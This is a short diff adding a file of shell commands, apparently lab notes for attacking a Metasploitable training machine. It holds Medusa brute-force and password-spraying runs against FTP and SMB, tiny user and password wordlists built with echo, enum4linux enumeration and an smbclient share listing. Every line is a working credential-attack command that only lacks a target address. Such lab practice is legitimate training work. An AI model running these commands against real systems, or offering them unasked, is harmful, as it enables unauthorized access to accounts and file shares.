@@ -1,0 +1,7 @@
+medusa -h <IP> -U users.txt -P passwords.txt -M ftp -t 6
+echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
+echo -e 'user\nmsfadmin\nadmin\nroot' > user.txt
+enum4linux -a (IP) | tee enum4_output.txt
+less enum4_output.txt
+medusa -h (IP) -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+smbclient -L //(IP) -U msfadmin
